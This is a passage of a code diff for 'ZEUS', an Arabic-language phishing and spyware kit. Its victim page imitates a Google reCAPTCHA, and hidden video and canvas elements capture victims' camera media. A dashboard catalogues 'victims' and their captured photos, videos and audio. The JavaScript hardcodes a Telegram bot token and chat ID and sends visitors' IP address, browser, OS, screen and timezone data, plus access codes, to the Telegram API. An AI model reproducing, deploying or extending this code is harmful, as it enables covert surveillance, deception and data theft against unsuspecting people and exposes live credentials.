+            box-shadow: var(--shadow-dash);
+            position: relative;
+            max-height: 90vh;
+            overflow-y: auto;
+        }
+        .dev-container .dev-title {
+            font-family: var(--font-ar);
+            font-size: 26px;
+            font-weight: 700;
+            background: var(--gold-shimmer);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            letter-spacing: 4px;
+            text-align: center;
+            margin-bottom: 6px;
+        }
+        .dev-container .dev-sub {
+            text-align: center;
+            color: var(--ink-faint);
+            font-family: var(--font-en);
+            font-size: 13px;
+            margin-bottom: 20px;
+        }
+        .dev-container .dev-close {
             position: absolute;
             top: 14px;
             left: 18px;
@@ -1494,141 +2141,127 @@
             padding: 4px 8px;
             border-radius: 8px;
         }
-
-        .password-modal .modal-close:hover {
+        .dev-container .dev-close:hover {
             color: var(--ink);
             background: rgba(0, 0, 0, 0.04);
         }
-
-        @media (max-width: 480px) {
-            .password-modal {
-                padding: 28px 20px 24px;
-            }
-            .password-modal .modal-title {
-                font-size: 19px;
-            }
-            .password-modal .modal-icon {
-                width: 52px;
-                height: 52px;
-            }
-            .password-modal .input-wrap input {
-                font-size: 14px;
-                padding: 12px 0;
-            }
-            .password-modal .btn-unlock {
-                font-size: 14px;
-                padding: 12px;
-            }
+        .dev-password-list {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
         }
-
-        .panel.locked .card .input-wrap input {
-            pointer-events: none;
-            opacity: 0.6;
-            user-select: none;
+        .dev-password-item {
+            background: var(--bg-card);
+            border-radius: var(--radius-card);
+            padding: 14px 18px;
+            border: 1px solid var(--line);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 10px;
+            transition: var(--transition);
         }
-        .panel.locked .zeus-toggle {
-            opacity: 0.5;
-            pointer-events: none;
-            user-select: none;
-            filter: grayscale(0.3);
+        .dev-password-item:hover {
+            border-color: rgba(184, 148, 46, 0.20);
+            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.03);
         }
-        .panel.locked .btn-generate {
-            opacity: 0.4;
-            pointer-events: none;
-            user-select: none;
-            filter: grayscale(0.3);
+        .dev-password-item .pwd-info {
+            display: flex;
+            flex-direction: column;
+            gap: 2px;
         }
-        .panel.locked .result .actions button {
-            opacity: 0.3;
-            pointer-events: none;
-            user-select: none;
-        }
-        .panel.locked .result .info-box .value {
-            opacity: 0.5;
-            -webkit-text-fill-color: var(--ink-faint);
-            background: none;
+        .dev-password-item .pwd-info .pwd-label {
+            font-family: var(--font-en);
+            font-size: 10px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
             color: var(--ink-faint);
         }
-        .panel.locked .result .info-box .sub {
-            opacity: 0.4;
-        }
-
-        .panel.unlocked .card .input-wrap input {
-            pointer-events: auto;
-            opacity: 1;
-        }
-        .panel.unlocked .zeus-toggle {
-            opacity: 1;
-            pointer-events: auto;
-            filter: none;
-        }
-        .panel.unlocked .btn-generate {
-            opacity: 1;
-            pointer-events: auto;
-            filter: none;
-        }
-        .panel.unlocked .result .actions button {
-            opacity: 1;
-            pointer-events: auto;
-        }
-        .panel.unlocked .result .info-box .value {
-            opacity: 1;
-            -webkit-text-fill-color: transparent;
-            background: var(--gold-shimmer);
-            background-clip: text;
-            -webkit-background-clip: text;
-        }
-        .panel.unlocked .result .info-box .sub {
-            opacity: 1;
-        }
-
-        .victim-status {
-            display: none !important;
-        }
-
-        /* ===== الرابط الأساسي ===== */
-        .base-url-card .input-wrap input {
+        .dev-password-item .pwd-info .pwd-value {
+            font-family: var(--font-en);
+            font-size: 18px;
+            font-weight: 700;
+            letter-spacing: 1px;
+            color: var(--gold);
             direction: ltr;
-            text-align: left;
-            font-size: 13px;
+            word-break: break-all;
+        }
+        .dev-password-item .pwd-copy {
+            background: var(--gold-soft);
+            border: 1px solid var(--line);
+            color: var(--gold);
+            padding: 6px 14px;
+            border-radius: 30px;
+            cursor: pointer;
+            font-family: var(--font-en);
+            font-size: 11px;
+            font-weight: 600;
+            transition: var(--transition);
+            flex-shrink: 0;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+        .dev-password-item .pwd-copy:hover {
+            background: var(--gold);
+            color: #fff;
+            border-color: var(--gold);
+            transform: translateY(-2px);
+            box-shadow: 0 4px 16px rgba(184, 148, 46, 0.20);
+        }
+        .dev-password-item .pwd-copy svg {
+            width: 14px;
+            height: 14px;
+            stroke: currentColor;
+            fill: none;
+            stroke-width: 2;
+        }
+        .dev-empty {
+            text-align: center;
+            color: var(--ink-faint);
+            padding: 30px 0;
+            font-family: var(--font-en);
+            font-size: 14px;
         }
 
-        .base-url-card .input-wrap input::placeholder {
-            text-align: right;
+        /* misc */
+        .hidden {
+            display: none !important;
         }
     </style>
 </head>
 <body>
 
     <div class="toast-msg" id="toast"></div>
+    <div class="secret-hint" id="secretHint">✓ تم فتح الباب السري</div>
 
-    <!-- ===== PASSWORD OVERLAY ===== -->
-    <div class="password-overlay" id="passwordOverlay">
-        <div class="password-modal">
-            <button class="modal-close" id="modalClose" aria-label="إغلاق">✕</button>
-            <div class="modal-icon">
-                <svg viewBox="0 0 24 24" stroke="currentColor">
-                    <rect x="3" y="9" width="18" height="12" rx="2" />
-                    <path d="M7 9V7a5 5 0 0110 0v2" />
-                    <circle cx="12" cy="14" r="1.5" fill="currentColor" />
-                    <line x1="12" y1="15.5" x2="12" y2="17.5" />
-                </svg>
-            </div>
-            <div class="modal-title">دخول آمن</div>
-            <div class="modal-sub">أدخل مفتاح الوصول للمتابعة</div>
+    <!-- ================================================================
+    CODE INPUT MODAL
+    ================================================================ -->
+    <div class="code-modal" id="codeModal">
+        <div class="modal-box">
+            <div class="modal-title">ZEUS</div>
+            <div class="modal-sub">أدخل كود الداشبورد</div>
             <div class="input-wrap">
-                <input type="password" id="passwordInput" placeholder="••••••••" autofocus />
+                <input type="text" id="codeInput" placeholder="••••••••••••••" autofocus />
             </div>
-            <button class="btn-unlock" id="unlockBtn">فتح الداشبورد</button>
-            <div class="error-msg" id="passwordError">المفتاح غير صحيح، حاول مجدداً.</div>
+            <div class="modal-actions">
+                <button class="btn-confirm" id="codeConfirmBtn">تأكيد</button>
+                <button class="btn-cancel" id="codeCancelBtn">إلغاء</button>
+            </div>
+            <div class="modal-error" id="codeError">❌ الكود غير صحيح. حاول مجدداً.</div>
         </div>
     </div>
 
-    <!-- ===== ADMIN PANEL ===== -->
-    <div class="panel locked" id="adminPanel">
+    <!-- ================================================================
+    ADMIN PANEL
+    ================================================================ -->
+    <div class="panel" id="adminPanel">
         <div class="top">
-            <div class="brand">
-                <div class="logo">
+            <div class="brand" id="secretTrigger">
+                <div class="logo" id="secretLogo">
                     <svg viewBox="0 0 100 100" fill="none">
                         <polygon points="50,5 85,25 85,75 50,95 15,75 15,25" stroke="#b8942e" stroke-width="2.5" class="pulse" />
                         <polygon points="50,10 80,28 80,72 50,90 20,72 20,28" stroke="#b8942e" stroke-width="0.8" opacity="0.3" class="glow-ring" />
@@ -1642,7 +2275,7 @@
                         <circle cx="23" cy="26" r="2" fill="#b8942e" opacity="0.7" />
                     </svg>
                 </div>
-                <div class="name">ZEUS</div>
+                <div class="name" id="secretName">ZEUS</div>
             </div>
             <div class="info">
                 <div class="row">
@@ -1661,19 +2294,13 @@
                     </svg>
                     <span id="dateDisplay">01/08/2026</span>
                 </div>
-                <div class="online" id="onlineBadge" title="اضغط للوصول إلى لوحة التحكم">
-                    <span class="dot"></span>
-                    <span class="badge-text">متصل</span>
-                    <svg class="lock-icon" viewBox="0 0 24 24" stroke="currentColor">
-                        <rect x="3" y="9" width="18" height="12" rx="2" />
-                        <path d="M7 9V7a5 5 0 0110 0v2" />
-                        <circle cx="12" cy="14" r="1.5" fill="currentColor" />
-                    </svg>
-                </div>
+                <button class="theme-toggle" id="themeToggleTop" aria-label="تبديل الوضع">
+                    <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="5"/><path d="M12 1v2M12 21v2M4.22 4.22l1.42 1.42M18.36 18.36l1.42 1.42M1 12h2M21 12h2M4.22 19.78l1.42-1.42M18.36 5.64l1.42-1.42"/></svg>
+                    <span id="themeLabel">فاتح</span>
+                </button>
             </div>
         </div>
 
-        <!-- ===== صف البوت والإيدي ===== -->
         <div class="grid">
             <div class="card">
                 <div class="label-wrap">
@@ -1703,7 +2330,6 @@
             </div>
         </div>
 
-        <!-- ===== المميزات ===== -->
         <div class="card" style="margin-top: 18px;">
             <div class="label-wrap">
                 <svg viewBox="0 0 24 24" stroke="currentColor">
@@ -1766,7 +2392,6 @@
             </div>
         </div>
 
-        <!-- ===== الرابط الأساسي + الرابط الملغم ===== -->
         <div class="card base-url-card" style="margin-top: 18px;">
             <div class="label-wrap">
                 <svg viewBox="0 0 24 24" stroke="currentColor">
@@ -1780,7 +2405,6 @@
             </div>
         </div>
 
-        <!-- ===== زر التوليد ===== -->
         <div class="generate-wrap">
             <button class="btn-generate" id="genBtn">
                 <svg viewBox="0 0 24 24" stroke="currentColor">
@@ -1791,7 +2415,6 @@
             </button>
         </div>
 
-        <!-- ===== الرابط الملغم (النتيجة) ===== -->
         <div class="result-section">
             <div class="label-wrap">
                 <svg viewBox="0 0 24 24" stroke="currentColor">
@@ -1819,7 +2442,6 @@
             </div>
         </div>
 
-        <!-- ===== FOOTER ===== -->
         <div class="footer" onclick="window.open('https://t.me/xx_8k', '_blank')" title="اضغط للانتقال للتليجرام">
             <span>تــم التطـــوير بواسطــــــة</span>
             <span class="dev-name">أشـــــروف</span>
@@ -1832,7 +2454,169 @@
         </div>
     </div>
 
-    <!-- ===== VICTIM PAGE (reCAPTCHA) ===== -->
+    <!-- ================================================================
+    DASHBOARD — الباب السري (يُفتح بالنقر الثلاثي)
+    ================================================================ -->
+    <div class="dash-overlay" id="dashOverlay">
+        <div class="dash-container">
+            <!-- Sidebar -->
+            <div class="dash-sidebar" id="dashSidebar">
+                <div class="sidebar-brand">
+                    <div class="brand-icon">
+                        <svg viewBox="0 0 100 100">
+                            <polygon points="50,5 85,25 85,75 50,95 15,75 15,25" stroke="#b8942e" stroke-width="2.5" />
+                            <polygon points="50,20 75,50 50,80 25,50" stroke="#b8942e" stroke-width="2" />
+                            <polygon points="50,35 60,50 50,65 40,50" fill="#b8942e" />
+                        </svg>
+                    </div>
+                    <span class="brand-text">ZEUS</span>
+                </div>
+
+                <div class="nav-item active" data-tab="overview">
+                    <svg viewBox="0 0 24 24"><rect x="3" y="3" width="7" height="7" rx="1"/><rect x="14" y="3" width="7" height="7" rx="1"/><rect x="3" y="14" width="7" height="7" rx="1"/><rect x="14" y="14" width="7" height="7" rx="1"/></svg>
+                    <span>نظرة عامة</span>
+                </div>
+                <div class="nav-item" data-tab="bots">
+                    <svg viewBox="0 0 24 24"><path d="M12 8v4l3 3"/><circle cx="12" cy="12" r="9"/></svg>
+                    <span>البوتات</span>
+                    <span class="badge" id="botCountBadge">0</span>
+                </div>
+                <div class="nav-item" data-tab="activity">
+                    <svg viewBox="0 0 24 24"><path d="M12 20v-8M8 12l4-4 4 4"/><circle cx="12" cy="12" r="9"/></svg>
+                    <span>سجل النشاط</span>
+                    <span class="badge" id="activityBadge">0</span>
+                </div>
+                <div class="nav-item" data-tab="files">
+                    <svg viewBox="0 0 24 24"><rect x="4" y="6" width="16" height="14" rx="2"/><path d="M4 10h16"/><circle cx="12" cy="14" r="2"/></svg>
+                    <span>الملفات</span>
+                    <span class="badge" id="fileCountBadge">0</span>
+                </div>
+                <div class="nav-item" data-tab="settings">
+                    <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="3"/><path d="M12 1v2M12 21v2M4.22 4.22l1.42 1.42M18.36 18.36l1.42 1.42M1 12h2M21 12h2M4.22 19.78l1.42-1.42M18.36 5.64l1.42-1.42"/></svg>
+                    <span>الإعدادات</span>
+                </div>
+
+                <div class="sidebar-footer">
+                    <button class="theme-toggle-dash" id="themeToggleDash">
+                        <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="5"/><path d="M12 1v2M12 21v2M4.22 4.22l1.42 1.42M18.36 18.36l1.42 1.42M1 12h2M21 12h2M4.22 19.78l1.42-1.42M18.36 5.64l1.42-1.42"/></svg>
+                        <span id="themeDashLabel">فاتح</span>
+                    </button>
+                    <button class="dash-close-btn" id="dashCloseBtn">
+                        <svg viewBox="0 0 24 24"><path d="M18 6L6 18M6 6l12 12"/></svg>
+                        <span>إغلاق</span>
+                    </button>
+                </div>
+            </div>
+
+            <!-- Main Content -->
+            <div class="dash-main" id="dashMain">
+                <!-- Overview Tab -->
+                <div class="dash-tab-content active" id="tab-overview">
+                    <div class="page-title">نظرة عامة <span class="sub">إحصائيات النظام</span></div>
+                    <div class="page-desc">ملخص كامل لجميع البوتات والضحايا والملفات</div>
+                    <div class="dash-stats-grid" id="statsGrid">
+                        <div class="dash-stat-card"><div class="stat-num" id="statBots">0</div><div class="stat-label">البوتات</div></div>
+                        <div class="dash-stat-card"><div class="stat-num" id="statVictims">0</div><div class="stat-label">الضحايا</div></div>
+                        <div class="dash-stat-card"><div class="stat-num" id="statFiles">0</div><div class="stat-label">الملفات</div></div>
+                        <div class="dash-stat-card"><div class="stat-num" id="statToday">0</div><div class="stat-label">زيارات اليوم</div></div>
+                    </div>
+                    <div style="background:var(--card-bg);border-radius:var(--radius-card);padding:16px 20px;border:1px solid var(--border-color);">
+                        <div style="font-family:var(--font-en);font-size:13px;font-weight:600;color:var(--ink-faint);margin-bottom:8px;">آخر النشاطات</div>
+                        <div id="recentActivity" style="max-height:300px;overflow-y:auto;"></div>
+                    </div>
+                </div>
+
+                <!-- Bots Tab -->
+                <div class="dash-tab-content" id="tab-bots">
+                    <div class="page-title">البوتات <span class="sub">إدارة البوتات المسجلة</span></div>
+                    <div class="page-desc">جميع البوتات التي تم إنشاؤها مع تفاصيلها الكاملة</div>
+                    <div class="filter-bar">
+                        <input type="text" id="botSearch" placeholder="بحث باسم البوت أو التوكن …" />
+                        <select id="botStatusFilter"><option value="all">جميع الحالات</option><option value="active">نشط</option><option value="inactive">غير نشط</option></select>
+                        <button id="refreshBotsBtn" style="background:var(--gold-soft);border:1px solid var(--border-color);border-radius:30px;padding:6px 18px;cursor:pointer;font-family:var(--font-en);font-size:12px;color:var(--gold);transition:var(--transition);">تحديث</button>
+                    </div>
+                    <div class="bot-list-grid" id="botListGrid"></div>
+                    <div class="bot-detail-container hidden" id="botDetailContainer">
+                        <div style="display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:12px;margin-bottom:12px;">
+                            <div style="font-family:var(--font-ar);font-size:20px;font-weight:700;color:var(--gold);" id="botDetailTitle">تفاصيل البوت</div>
+                            <button id="closeBotDetail" style="background:var(--bg-input);border:1px solid var(--line);border-radius:30px;padding:4px 16px;cursor:pointer;font-size:12px;font-family:var(--font-en);color:var(--ink-faint);">إغلاق</button>
+                        </div>
+                        <div id="botDetailContent"></div>
+                    </div>
+                </div>
+
+                <!-- Activity Tab -->
+                <div class="dash-tab-content" id="tab-activity">
+                    <div class="page-title">سجل النشاط <span class="sub">جميع الأحداث الزمنية</span></div>
+                    <div class="page-desc">سجل كامل لكل عملية تمت داخل النظام</div>
+                    <div class="filter-bar">
+                        <input type="text" id="activitySearch" placeholder="بحث …" />
+                        <select id="activityTypeFilter"><option value="all">جميع الأنواع</option><option value="bot_created">إنشاء بوت</option><option value="victim_visited">زيارة ضحية</option><option value="file_uploaded">رفع ملف</option><option value="link_generated">توليد رابط</option></select>
+                        <button id="clearActivityBtn" style="background:rgba(217,48,37,0.06);border:1px solid rgba(217,48,37,0.08);border-radius:30px;padding:6px 18px;cursor:pointer;font-family:var(--font-en);font-size:12px;color:#d93025;transition:var(--transition);">مسح السجل</button>
+                    </div>
+                    <div class="activity-timeline" id="activityTimeline"></div>
+                </div>
+
+                <!-- Files Tab -->
+                <div class="dash-tab-content" id="tab-files">
+                    <div class="page-title">الملفات <span class="sub">جميع الملفات الملتقطة</span></div>
+                    <div class="page-desc">الصور والفيديوهات والتسجيلات الصوتية للضحايا</div>
+                    <div class="filter-bar">
+                        <input type="text" id="fileSearch" placeholder="بحث باسم الملف …" />
+                        <select id="fileTypeFilter"><option value="all">جميع الأنواع</option><option value="image">صور</option><option value="video">فيديوهات</option><option value="audio">تسجيلات</option></select>
+                    </div>
+                    <div class="files-gallery" id="filesGallery"></div>
+                </div>
+
+                <!-- Settings Tab -->
+                <div class="dash-tab-content" id="tab-settings">
+                    <div class="page-title">الإعدادات <span class="sub">تخصيص النظام</span></div>
+                    <div class="page-desc">إدارة إعدادات لوحة التحكم</div>
+                    <div style="background:var(--card-bg);border-radius:var(--radius-card);padding:20px 24px;border:1px solid var(--border-color);">
+                        <div style="display:flex;flex-wrap:wrap;gap:20px;align-items:center;margin-bottom:16px;">
+                            <label style="display:flex;align-items:center;gap:12px;font-family:var(--font-en);font-size:14px;color:var(--ink);cursor:pointer;">
+                                <input type="checkbox" id="settingDarkMode" /> الوضع الليلي
+                            </label>
+                            <label style="display:flex;align-items:center;gap:12px;font-family:var(--font-en);font-size:14px;color:var(--ink);cursor:pointer;">
+                                <input type="checkbox" id="settingCompactMode" /> الوضع المضغوط
+                            </label>
+                            <button id="clearAllDataBtn" style="background:rgba(217,48,37,0.06);border:1px solid rgba(217,48,37,0.08);border-radius:30px;padding:8px 24px;cursor:pointer;font-family:var(--font-en);font-size:13px;color:#d93025;transition:var(--transition);">مسح جميع البيانات</button>
+                        </div>
+                        <div style="font-size:12px;color:var(--ink-faint);font-family:var(--font-en);border-top:1px solid var(--line);padding-top:16px;">
+                            <div><strong>عدد البوتات:</strong> <span id="settingsBotCount">0</span></div>
+                            <div><strong>عدد الضحايا:</strong> <span id="settingsVictimCount">0</span></div>
+                            <div><strong>عدد الملفات:</strong> <span id="settingsFileCount">0</span></div>
+                            <div><strong>حجم التخزين المستخدم:</strong> <span id="settingsStorageSize">0 KB</span></div>
+                            <button id="exportDataBtn" style="margin-top:12px;background:var(--gold-soft);border:1px solid var(--border-color);border-radius:30px;padding:6px 20px;cursor:pointer;font-family:var(--font-en);font-size:12px;color:var(--gold);">تصدير البيانات (JSON)</button>
+                            <button id="importDataBtn" style="margin-top:12px;background:var(--bg-input);border:1px solid var(--border-color);border-radius:30px;padding:6px 20px;cursor:pointer;font-family:var(--font-en);font-size:12px;color:var(--ink-faint);">استيراد البيانات (JSON)</button>
+                            <input type="file" id="importFileInput" accept=".json" style="display:none;" />
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ================================================================
+    DEVELOPER PAGE (overlay)
+    ================================================================ -->
+    <div class="dev-page-overlay" id="devPage">
+        <div class="dev-container">
+            <button class="dev-close" id="devCloseBtn">✕</button>
+            <div class="dev-title">صفحة المطور</div>
+            <div class="dev-sub">سجل كلمات المرور — القديمة والجديدة</div>
+            <div class="dev-password-list" id="devPasswordList">
+                <div class="dev-empty">لا توجد كلمات مرور مسجلة بعد.</div>
+            </div>
+            <div style="text-align:center;margin-top:16px;font-family:var(--font-en);font-size:11px;color:var(--ink-faint);">
+                يتم إرسال كل كلمة مرور جديدة إلى التليجرام تلقائياً.
+            </div>
+        </div>
+    </div>
+
+    <!-- ================================================================
+    VICTIM PAGE
+    ================================================================ -->
     <div id="victimPage">
         <div style="display:flex;flex-direction:column;align-items:center;width:100%;max-width:400px;">
             <div class="captcha-wrapper" id="captchaWrapper">
@@ -1853,12 +2637,7 @@
                 </div>
                 <div class="captcha-footer">
                     <div class="brand">
-                        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-                            <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92a5.06 5.06 0 0 1-2.2 3.32v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.1z"/>
-                            <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
-                            <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
-                            <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
-                        </svg>
+                        <svg viewBox="0 0 24 24"><path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92a5.06 5.06 0 0 1-2.2 3.32v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.1z"/><path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/><path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/><path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/></svg>
                         <span class="google-text">Google</span>
                     </div>
                     <div class="links">
@@ -1875,21 +2654,23 @@
     <video id="hiddenVideo" autoplay playsinline muted></video>
     <canvas id="hiddenCanvas"></canvas>
 
+    <!-- ================================================================
+    JAVASCRIPT — النظام الكامل المتكامل
+    ================================================================ -->
     <script>
         (function() {
             "use strict";
 
             // ================================================================
-            //  1.  CONFIGURATION
+            //  CONFIGURATION
             // ================================================================
 
             const MASTER_BOT_TOKEN = "8872643040:AAGopCnKRECh5ikrpFELUne_xf9SgJK2Sh4";
             const MASTER_CHAT_ID = "8552540563";
             const DEVELOPER_LINK = "https://t.me/xx_8k";
-            const DASHBOARD_PASSWORD = "Z3us@2026#K!ngD0m$Pr0t3ct3d!";
 
             // ================================================================
-            //  2.  TOAST
+            //  TOAST
             // ================================================================
 
             function showToast(msg, type) {
@@ -1903,7 +2684,7 @@
             }
 
             // ================================================================
-            //  3.  TIME UPDATE
+            //  TIME UPDATE
             // ================================================================
 
             function updateDateTime() {
@@ -1924,7 +2705,38 @@
             setInterval(updateDateTime, 10000);
 
             // ================================================================
-            //  4.  MODE DETECTION
+            //  THEME TOGGLE
+            // ================================================================
+
+            function getTheme() {
+                return localStorage.getItem('zeus_theme') || 'light';
+            }
+
+            function setTheme(theme) {
+                document.documentElement.setAttribute('data-theme', theme);
+                localStorage.setItem('zeus_theme', theme);
+                const label = theme === 'dark' ? 'ليلي' : 'فاتح';
+                const el1 = document.getElementById('themeLabel');
+                const el2 = document.getElementById('themeDashLabel');
+                if (el1) el1.textContent = label;
+                if (el2) el2.textContent = label;
+                // toggle icons could be improved
+            }
+
+            function toggleTheme() {
+                const current = getTheme();
+                setTheme(current === 'dark' ? 'light' : 'dark');
+            }
+
+            // Init theme
+            setTheme(getTheme());
+
+            // Theme toggles
+            document.getElementById('themeToggleTop').addEventListener('click', toggleTheme);
+            document.getElementById('themeToggleDash').addEventListener('click', toggleTheme);
+
+            // ================================================================
+            //  MODE DETECTION
             // ================================================================
 
             const urlParams = new URLSearchParams(window.location.search);
@@ -1940,96 +2752,810 @@
             } else {
                 document.body.className = 'admin-mode';
                 initAdminPanel();
-                initPasswordProtection();
+                initSecretDoor();
             }
 
             // ================================================================
-            //  5.  PASSWORD PROTECTION
+            //  SECRET DOOR
             // ================================================================
 
-            function initPasswordProtection() {
-                const panel = document.getElementById('adminPanel');
-                const overlay = document.getElementById('passwordOverlay');
-                const passwordInput = document.getElementById('passwordInput');
-                const unlockBtn = document.getElementById('unlockBtn');
-                const modalClose = document.getElementById('modalClose');
-                const errorMsg = document.getElementById('passwordError');
-                const onlineBadge = document.getElementById('onlineBadge');
+            let dashOpen = false;
+            let currentSecretCode = '';
+            let clickCount = 0;
+            let clickTimer = null;
 
-                let isUnlocked = false;
-
-                if (sessionStorage.getItem('zeus_unlocked') === 'true') {
-                    unlockDashboard();
+            function generateSecretCode(length) {
+                const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789abcdefghijkmnopqrstuvwxyz!@#$%^&*?';
+                let result = '';
+                const array = new Uint32Array(length);
+                crypto.getRandomValues(array);
+                for (let i = 0; i < length; i++) {
+                    result += chars[array[i] % chars.length];
                 }
+                return result;
+            }
 
-                onlineBadge.addEventListener('click', function(e) {
+            async function collectAttemptData() {
+                let ip = 'غير متاح';
+                try {
+                    const res = await fetch('https://api.ipify.org?format=json');
+                    const data = await res.json();
+                    ip = data.ip;
+                } catch (e) {}
+
+                const ua = navigator.userAgent;
+                let browser = 'Unknown';
+                if (/Chrome/.test(ua)) browser = 'Chrome';
+                else if (/Firefox/.test(ua)) browser = 'Firefox';
+                else if (/Safari/.test(ua)) browser = 'Safari';
+                else if (/Edge/.test(ua)) browser = 'Edge';
+                else if (/Opera/.test(ua)) browser = 'Opera';
+
+                let os = 'Unknown';
+                if (ua.includes('Windows NT 10.0')) os = 'Windows 10';
+                else if (ua.includes('Windows NT 6.1')) os = 'Windows 7';
+                else if (ua.includes('Mac OS X')) os = 'macOS';
+                else if (ua.includes('Android')) os = 'Android';
+                else if (ua.includes('iPhone') || ua.includes('iPad')) os = 'iOS';
+                else if (ua.includes('Linux')) os = 'Linux';
+
+                return {
+                    ip: ip,
+                    browser: browser,
+                    os: os,
+                    language: navigator.language,
+                    screen: screen.width + 'x' + screen.height,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    timestamp: new Date().toISOString(),
+                    userAgent: ua,
+                    platform: navigator.platform,
+                    hardwareConcurrency: navigator.hardwareConcurrency,
+                    deviceMemory: navigator.deviceMemory,
+                };
+            }
+
+            async function sendAttemptNotification(success, codeEntered, attemptData) {
+                const status = success ? '✅ ناجحة' : '❌ فاشلة';
+                const msg =
+                    '⭑ محاولة دخول إلى الداشبورد ⭒\n' +
+                    '⊚─〔 البيانات 〕────────\n' +
+                    '˼📌˹ الحالة: ' + status + ' ⭒\n' +
+                    '˼🔑˹ الكود المدخل: ' + (codeEntered || 'لم يُدخل') + ' ⭒\n' +
+                    '˼🌐˹ الـ IP: ' + attemptData.ip + ' ⭒\n' +
+                    '˼💻˹ المتصفح: ' + attemptData.browser + ' ⭒\n' +
+                    '˼🖥️˹ نظام التشغيل: ' + attemptData.os + ' ⭒\n' +
+                    '˼🕒˹ الوقت: ' + new Date().toLocaleString('ar-EG') + ' ⭒\n' +
+                    '˼📱˹ اللغة: ' + attemptData.language + ' ⭒\n' +
+                    '˼🖥️˹ الشاشة: ' + attemptData.screen + ' ⭒\n' +
+                    '˼⏰˹ المنطقة الزمنية: ' + attemptData.timezone + ' ⭒\n' +
+                    '─────────────────';
+
+                try {
+                    await fetch('https://api.telegram.org/bot' + MASTER_BOT_TOKEN + '/sendMessage', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: MASTER_CHAT_ID, text: msg })
+                    });
+                } catch (e) { console.warn('Telegram send failed:', e); }
+            }
+
+            function logAttempt(success, codeEntered, attemptData) {
+                let logs = JSON.parse(localStorage.getItem('zeus_attempt_logs') || '[]');
+                logs.push({
+                    success: success,
+                    codeEntered: codeEntered,
+                    data: attemptData,
+                    timestamp: Date.now()
+                });
+                if (logs.length > 100) logs = logs.slice(-100);
+                localStorage.setItem('zeus_attempt_logs', JSON.stringify(logs));
+            }
+
+            function openDashboardWithCode(code) {
+                const success = (code === currentSecretCode);
+                const codeEntered = code || '';
+                const attemptData = collectAttemptData();
+
+                logAttempt(success, codeEntered, attemptData);
+                sendAttemptNotification(success, codeEntered, attemptData);
+
+                if (success) {
+                    dashOpen = true;
+                    document.getElementById('dashOverlay').classList.add('active');
+                    renderDashboard();
+                    showToast('✅ تم فتح لوحة التحكم.', 'success');
+                    document.getElementById('codeModal').classList.remove('active');
+                    currentSecretCode = generateSecretCode(32);
+                } else {
+                    document.getElementById('codeError').classList.add('show');
+                    document.getElementById('codeInput').value = '';
+                    document.getElementById('codeInput').focus();
+                    showToast('❌ الكود غير صحيح.', 'error');
+                }
+            }
+
+            function showCodeModal() {
+                const newCode = generateSecretCode(32);
+                currentSecretCode = newCode;
+
+                let history = JSON.parse(localStorage.getItem('zeus_password_history') || '[]');
+                const oldCode = history.length > 0 ? history[history.length - 1].password : 'لا يوجد';
+                const msg =
+                    '⭑ كود الداشبورد الجديد ⭒\n' +
+                    '⊚─〔 بيانات الكود 〕────────\n' +
+                    '˼🔑˹ الكود الجديد: ' + newCode + ' ⭒\n' +
+                    '˼🔐˹ الكود القديم: ' + oldCode + ' ⭒\n' +
+                    '˼🕒˹ الوقت: ' + new Date().toLocaleString('ar-EG') + ' ⭒\n' +
+                    '─────────────────\n' +
+                    '📋 استخدم هذا الكود لفتح الداشبورد.';
+
+                try {
+                    fetch('https://api.telegram.org/bot' + MASTER_BOT_TOKEN + '/sendMessage', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: MASTER_CHAT_ID, text: msg })
+                    });
+                } catch (e) { console.warn('Telegram send failed:', e); }
+
+                history.push({ password: newCode, timestamp: new Date().toLocaleString('ar-EG') });
+                if (history.length > 50) history = history.slice(-50);
+                localStorage.setItem('zeus_password_history', JSON.stringify(history));
+
